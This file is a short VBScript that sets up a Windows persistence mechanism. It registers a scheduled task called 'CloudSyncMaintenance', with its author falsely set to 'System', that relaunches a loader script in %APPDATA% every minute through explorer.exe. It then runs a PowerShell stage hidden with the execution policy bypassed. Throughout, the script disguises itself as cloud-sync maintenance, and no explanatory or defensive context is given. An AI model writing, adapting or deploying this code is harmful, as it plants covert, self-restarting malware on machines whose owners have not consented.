profile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
loader = profile & "\cloud-sync.vbs"
stage = profile & "\cloud-sync.ps1"

Set scheduler = CreateObject("Schedule.Service")
scheduler.Connect
Set root = scheduler.GetFolder("\")
Set definition = scheduler.NewTask(0)
Set trigger = definition.Triggers.Create(1)
Set action = definition.Actions.Create(0)

definition.RegistrationInfo.Description = "CloudSyncMaintenance"
definition.RegistrationInfo.Author = "System"
definition.Settings.Enabled = True
definition.Settings.StartWhenAvailable = True
trigger.StartBoundary = Year(Now) & "-" & Month(Now) & "-" & Day(Now) & "T" & Hour(Now) & ":" & Minute(Now) & ":" & Second(Now)
trigger.Repetition.Interval = "PT1M"

action.Path = "explorer.exe"
action.Arguments = """" & loader & """"
root.RegisterTaskDefinition "CloudSyncMaintenance", definition, 6, , , 3

CreateObject("WScript.Shell").Run "powershell.exe -ExecutionPolicy Bypass -File """ & stage & """", 0, False
